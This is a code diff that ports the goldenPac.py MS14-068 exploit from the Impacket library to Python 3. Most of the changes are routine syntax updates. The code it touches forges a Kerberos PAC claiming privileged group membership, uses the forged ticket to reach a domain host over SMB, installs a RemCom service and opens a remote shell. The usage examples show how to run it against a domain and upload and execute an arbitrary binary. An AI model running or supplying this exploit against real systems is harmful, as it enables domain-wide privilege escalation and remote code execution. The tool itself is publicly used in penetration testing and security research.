@@ -28,7 +28,8 @@
 #       if domain.net and/or domain-host do not resolve, add them
 #       to the hosts file or use the -dc-ip and -target-ip parameters
 #
-
+from __future__ import division
+from __future__ import print_function
 import cmd
 import logging
 import os
@@ -37,6 +38,7 @@ import string
 import time
 from binascii import unhexlify
 from threading import Thread, Lock
+from six import PY3
 
 from impacket.dcerpc.v5 import epm
 from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
@@ -58,6 +60,11 @@ from impacket.structure import Structure
 ################################################################################
 # HELPER FUNCTIONS
 ################################################################################
+
+def getFileTime(t):
+    t *= 10000000
+    t += 116444736000000000
+    return t
 
 class RemComMessage(Structure):
     structure = (
@@ -97,7 +104,7 @@ class PSEXEC:
         dce = rpctransport.get_dce_rpc()
         try:
             dce.connect()
-        except Exception, e:
+        except Exception as e:
             logging.critical(str(e))
             sys.exit(1)
 
@@ -115,7 +122,7 @@ class PSEXEC:
             else:
                 try:
                     f = open(self.__exeFile)
-                except Exception, e:
+                except Exception as e:
                     logging.critical(str(e))
                     sys.exit(1)
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
@@ -132,18 +139,18 @@ class PSEXEC:
                 self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
 
             tid = s.connectTree('IPC$')
-            fid_main = self.openPipe(s,tid,'\RemCom_communicaton',0x12019f)
+            fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
 
             packet = RemComMessage()
             pid = os.getpid()
 
-            packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
+            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
             if self.__path is not None:
                 packet['WorkingDir'] = self.__path
             packet['Command'] = self.__command
             packet['ProcessID'] = pid
 
-            s.writeNamedPipe(tid, fid_main, str(packet))
+            s.writeNamedPipe(tid, fid_main, packet.getData())
 
             # Here we'll store the command we type so we don't print it back ;)
             # ( I know.. globals are nasty :P )
@@ -152,16 +159,16 @@ class PSEXEC:
 
             # Create the pipes threads
             stdin_pipe = RemoteStdInPipe(rpctransport,
-                                         '\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                                         r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                          smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
                                          installService.getShare())
             stdin_pipe.start()
             stdout_pipe = RemoteStdOutPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                                           r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stdout_pipe.start()
             stderr_pipe = RemoteStdErrPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                                           r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stderr_pipe.start()
             
@@ -197,7 +204,8 @@ class PSEXEC:
             try:
                 s.waitNamedPipe(tid,pipe)
                 pipeReady = True
-            except:
+            except Exception as e:
+                print(str(e))
                 tries -= 1
                 time.sleep(2)
                 pass
@@ -257,7 +265,7 @@ class RemoteStdOutPipe(Pipes):
                 try:
                         global LastDataSent
                         if ans != LastDataSent:
-                            sys.stdout.write(ans)
+                            sys.stdout.write(ans.decode('cp437'))
                             sys.stdout.flush()
                         else:
                             # Don't echo what I sent, and clear it up
@@ -308,13 +316,13 @@ class RemoteShell(cmd.Cmd):
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
     def do_help(self, line):
-        print """
+        print("""
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
  put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
  get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
  ! {cmd}                    - executes a local shell cmd
-""" % (self.share, self.share)
+""" % (self.share, self.share))
         self.send_data('\r\n', False)
 
     def do_shell(self, s):
@@ -329,10 +337,10 @@ class RemoteShell(cmd.Cmd):
             import ntpath
             filename = ntpath.basename(src_path)
             fh = open(filename,'wb')
-            logging.info("Downloading %s\%s" % (self.share, src_path))
+            logging.info("Downloading %s\\%s" % (self.share, src_path))
             self.transferClient.getFile(self.share, src_path, fh.write)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -353,11 +361,14 @@ class RemoteShell(cmd.Cmd):
             src_file = os.path.basename(src_path)
             fh = open(src_path, 'rb')
             f = dst_path + '/' + src_file
-            pathname = string.replace(f,'/','\\')
-            logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
-            self.transferClient.putFile(self.share, pathname, fh.read)
+            pathname = f.replace('/','\\')
+            logging.info("Uploading %s to %s\\%s" % (src_file, self.share, dst_path))
+            if PY3:
+                self.transferClient.putFile(self.share, pathname, fh.read)
+            else:
+                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -366,11 +377,11 @@ class RemoteShell(cmd.Cmd):
 
     def do_lcd(self, s):
         if s == '':
-            print os.getcwd()
+            print(os.getcwd())
         else:
             try:
                 os.chdir(s)
-            except Exception, e:
+            except Exception as e:
                 logging.error(str(e))
         self.send_data('\r\n')
 
@@ -379,7 +390,10 @@ class RemoteShell(cmd.Cmd):
         return
 
     def default(self, line):
-        self.send_data(line+'\r\n')
+        if PY3:
+            self.send_data(line.encode('cp437')+b'\r\n')
+        else:
+            self.send_data(line.decode(sys.stdin.encoding).encode('cp437')+'\r\n')
 
     def send_data(self, data, hideOutput = True):
         if hideOutput is True:
@@ -504,11 +518,11 @@ class MS14_068:
             kerbdata['GroupIds'].append(groupMembership)
 
         kerbdata['UserFlags']         = 0
-        kerbdata['UserSessionKey']    = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata['UserSessionKey']    = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['LogonServer']       = ''
         kerbdata['LogonDomainName']   = self.__domain
         kerbdata['LogonDomainId']     = self.__domainSid
-        kerbdata['LMKey']             = '\x00\x00\x00\x00\x00\x00\x00\x00'
+        kerbdata['LMKey']             = b'\x00\x00\x00\x00\x00\x00\x00\x00'
         kerbdata['UserAccountControl']= USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
         kerbdata['SubAuthStatus']     = 0
         kerbdata['LastSuccessfulILogon']['dwLowDateTime']  = 0
@@ -549,8 +563,8 @@ class MS14_068:
             validationInfo.dump()
             print ('\n')
 
-        validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
-        validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))
+        validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()
+        validationInfoAlignment = b'\x00' * (((len(validationInfoBlob) + 7) // 8 * 8) - len(validationInfoBlob))
 
         # 2) PAC_CLIENT_INFO
         pacClientInfo = PAC_CLIENT_INFO()
@@ -562,86 +576,86 @@ class MS14_068:
             name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
         pacClientInfo['NameLength'] = len(name)
         pacClientInfo['Name'] = name
-        pacClientInfoBlob = str(pacClientInfo)
-        pacClientInfoAlignment = '\x00'*(((len(pacClientInfoBlob)+7)/8*8)-len(pacClientInfoBlob))
+        pacClientInfoBlob = pacClientInfo.getData()
+        pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
 
         # 3) PAC_SERVER_CHECKSUM/PAC_SIGNATURE_DATA
         serverChecksum = PAC_SIGNATURE_DATA()
 
         # If you wanna do CRC32, uncomment this
         #serverChecksum['SignatureType'] = self.CRC_32
-        #serverChecksum['Signature'] = '\x00'*4
+        #serverChecksum['Signature'] = b'\x00'*4
 
         # If you wanna do MD4, uncomment this
         #serverChecksum['SignatureType'] = self.RSA_MD4
-        #serverChecksum['Signature'] = '\x00'*16
+        #serverChecksum['Signature'] = b'\x00'*16
 
         # If you wanna do MD5, uncomment this
         serverChecksum['SignatureType'] = self.RSA_MD5
-        serverChecksum['Signature'] = '\x00'*16
+        serverChecksum['Signature'] = b'\x00'*16
 
-        serverChecksumBlob = str(serverChecksum)
-        serverChecksumAlignment = '\x00'*(((len(serverChecksumBlob)+7)/8*8)-len(serverChecksumBlob))
+        serverChecksumBlob = serverChecksum.getData()
+        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))
 
         # 4) PAC_PRIVSVR_CHECKSUM/PAC_SIGNATURE_DATA
         privSvrChecksum = PAC_SIGNATURE_DATA()
 
         # If you wanna do CRC32, uncomment this
         #privSvrChecksum['SignatureType'] = self.CRC_32
-        #privSvrChecksum['Signature'] = '\x00'*4
+        #privSvrChecksum['Signature'] = b'\x00'*4
 
         # If you wanna do MD4, uncomment this
         #privSvrChecksum['SignatureType'] = self.RSA_MD4
-        #privSvrChecksum['Signature'] = '\x00'*16
+        #privSvrChecksum['Signature'] = b'\x00'*16
 
         # If you wanna do MD5, uncomment this
         privSvrChecksum['SignatureType'] = self.RSA_MD5
-        privSvrChecksum['Signature'] = '\x00'*16
+        privSvrChecksum['Signature'] = b'\x00'*16
 
-        privSvrChecksumBlob = str(privSvrChecksum)
-        privSvrChecksumAlignment = '\x00'*(((len(privSvrChecksumBlob)+7)/8*8)-len(privSvrChecksumBlob))
+        privSvrChecksumBlob = privSvrChecksum.getData()
+        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))
 
         # The offset are set from the beginning of the PAC_TYPE
         # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(str(PAC_INFO_BUFFER()))*4
+        offsetData = 8 + len(PAC_INFO_BUFFER().getData())*4
 
         # Let's build the PAC_INFO_BUFFER for each one of the elements
         validationInfoIB = PAC_INFO_BUFFER()
         validationInfoIB['ulType'] = PAC_LOGON_INFO
         validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
         validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+validationInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         pacClientInfoIB = PAC_INFO_BUFFER()
         pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
         pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
         pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+pacClientInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         serverChecksumIB = PAC_INFO_BUFFER()
         serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
         serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
         serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData+serverChecksumIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
 
         privSvrChecksumIB = PAC_INFO_BUFFER()
         privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
         privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
         privSvrChecksumIB['Offset'] = offsetData
-        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
+        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) //8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
-            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
-            pacClientInfo) + pacClientInfoAlignment
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
+            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
+            pacClientInfo.getData() + pacClientInfoAlignment
+        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
 
         pacType = PACTYPE()
         pacType['cBuffers'] = 4
         pacType['Version'] = 0
         pacType['Buffers'] = buffers + buffersTail
 
-        blobToChecksum = str(pacType)
+        blobToChecksum = pacType.getData()
 
         # If you want to do CRC-32, ucomment this
         #serverChecksum['Signature'] = struct.pack('<L', (binascii.crc32(blobToChecksum, 0xffffffff) ^ 0xffffffff) & 0xffffffff)
@@ -655,13 +669,13 @@ class MS14_068:
         serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
         privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest() 
 
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
-        authorizationData[0]['ad-data'] = str(pacType)
+        authorizationData[0]['ad-data'] = pacType.getData()
         return encoder.encode(authorizationData)
 
     def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime):
@@ -697,7 +711,7 @@ class MS14_068:
 
         reqBody['kdc-options'] = constants.encodeFlags(opts)
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
-        reqBody['realm'] = str(decodedTGT['crealm'])
+        reqBody['realm'] = decodedTGT['crealm'].prettyPrint()
 
         now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
 
@@ -718,7 +732,7 @@ class MS14_068:
 
         authenticator = Authenticator()
         authenticator['authenticator-vno'] = 5
-        authenticator['crealm'] = str(decodedTGT['crealm'])
+        authenticator['crealm'] = decodedTGT['crealm'].prettyPrint()
 
         clientName = Principal()
         clientName.from_asn1( decodedTGT, 'crealm', 'cname')
@@ -769,11 +783,11 @@ class MS14_068:
         # Key Usage 8
         # TGS-REP encrypted part (includes application session
         # key), encrypted with the TGS session key (Section 5.4.2)
-        plainText = cipher.decrypt(sessionKey, 8, str(cipherText))
+        plainText = cipher.decrypt(sessionKey, 8, cipherText)
 
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
-        newSessionKey = Key(cipher.enctype, str(encTGSRepPart['key']['keyvalue']))
+        newSessionKey = Key(cipher.enctype, encTGSRepPart['key']['keyvalue'].asOctets())
     
         return r, cipher, sessionKey, newSessionKey
 
@@ -847,8 +861,8 @@ class MS14_068:
         drs['dwFlagsExt'] = 0
         drs['ConfigObjGUID'] = NULLGUID
         drs['dwExtCaps'] = 127
-        request['pextClient']['cb'] = len(drs)
-        request['pextClient']['rgb'] = list(str(drs))
+        request['pextClient']['cb'] = len(drs.getData())
+        request['pextClient']['rgb'] = list(drs.getData())
         resp = dce.request(request)
 
         dcs = hDRSDomainControllerInfo(dce,  resp['phDrs'], self.__domain, 1)
@@ -894,7 +908,7 @@ class MS14_068:
         self.__domainSid, self.__rid = self.getUserSID()
         try:
             self.__forestSid = self.getForestSid()
-        except Exception, e:
+        except Exception as e:
             # For some reason we couldn't get the forest data. No problem, we can still continue
             # Only drawback is we won't get forest admin if successful
             logging.error('Couldn\'t get forest info (%s), continuing' % str(e))
@@ -916,7 +930,7 @@ class MS14_068:
                     tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                             self.__lmhash, self.__nthash, None,
                                                                             self.__kdcHost, requestPAC=False)
-                except KerberosError, e:
+                except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -942,8 +956,8 @@ class MS14_068:
                 if asRep['padata']:
                     for pa in asRep['padata']:
                         if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
-                            etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
-                            salt = str(etype2['salt'])
+                            etype2 = decoder.decode(pa['padata-value'][2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                            salt = etype2['salt'].prettyPrint()
 
                 cipherText = asRep['enc-part']['cipher']
 
@@ -956,7 +970,7 @@ class MS14_068:
                 else:
                     key = cipher.string_to_key(self.__password, salt, None)
 
-                plainText = cipher.decrypt(key, 3, str(cipherText))
+                plainText = cipher.decrypt(key, 3, cipherText)
                 encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
                 authTime = encASRepPart['authtime']
 
@@ -971,7 +985,7 @@ class MS14_068:
                     tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain,
                                                                                         self.__kdcHost, tgs, cipher,
                                                                                         sessionKey)
-                except KerberosError, e:
+                except KerberosError as e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -1037,7 +1051,6 @@ if __name__ == '__main__':
     from calendar import timegm
     from time import strptime
     from impacket import version
-    from impacket.smbserver import getFileTime
     from impacket.dcerpc.v5 import samr
     from impacket.dcerpc.v5 import transport
     from impacket.krb5.types import Principal, Ticket, KerberosTime
@@ -1053,7 +1066,7 @@ if __name__ == '__main__':
     from pyasn1.codec.der import decoder, encoder
     from Cryptodome.Hash import MD5
 
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True,
                                      description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
@@ -1080,15 +1093,15 @@ if __name__ == '__main__':
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nExamples: "
-        print "\tpython goldenPac domain.net/normaluser@domain-host\n"
-        print "\tthe password will be asked, or\n"
-        print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
-        print "\tif domain.net and/or domain-machine do not resolve, add them"
-        print "\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
-        print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
-        print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
-        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
+        print("\nExamples: ")
+        print("\tpython goldenPac domain.net/normaluser@domain-host\n")
+        print("\tthe password will be asked, or\n")
+        print("\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n")
+        print("\tif domain.net and/or domain-machine do not resolve, add them")
+        print("\tto the hosts file or explicitly specify the domain IP (e.g. 1.1.1.1) and target IP:\n")
+        print("\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n")
+        print("\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn")
+        print("\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n")
         sys.exit(1)
  
     options = parser.parse_args()
@@ -1125,9 +1138,8 @@ if __name__ == '__main__':
 
     try:
         dumper.exploit()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
         logging.critical(str(e))
-
